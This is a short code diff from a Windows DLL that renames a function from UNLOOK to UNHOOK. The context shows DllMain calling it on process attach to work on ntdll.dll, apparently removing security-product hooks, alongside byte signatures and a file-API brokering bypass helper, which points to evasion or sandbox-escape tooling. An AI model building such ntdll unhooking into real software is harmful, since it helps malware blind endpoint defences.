@@ -239,7 +239,7 @@ size_t GetSkipFileAPIBrokering(VOID)
     unsigned char win7_lock_count_flag[] = {0xC7, 0x45, 0xFC, 0xFE, 0xFF, 0xFF, 0xFF, 0xBB, 0xFF, 0xFF, 0xFF, 0xFF, 0x8B, 0x75, 0xD8};
 #endif
 
-VOID UNLOOK()
+VOID UNHOOK()
 {
     HMODULE base = GetModuleHandleA("ntdll.dll");
     DWORD rdataLength;
@@ -305,7 +305,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-        UNLOOK();
+        UNHOOK();
 
         STARTUPINFOA si = { sizeof(si) };
         PROCESS_INFORMATION pi;
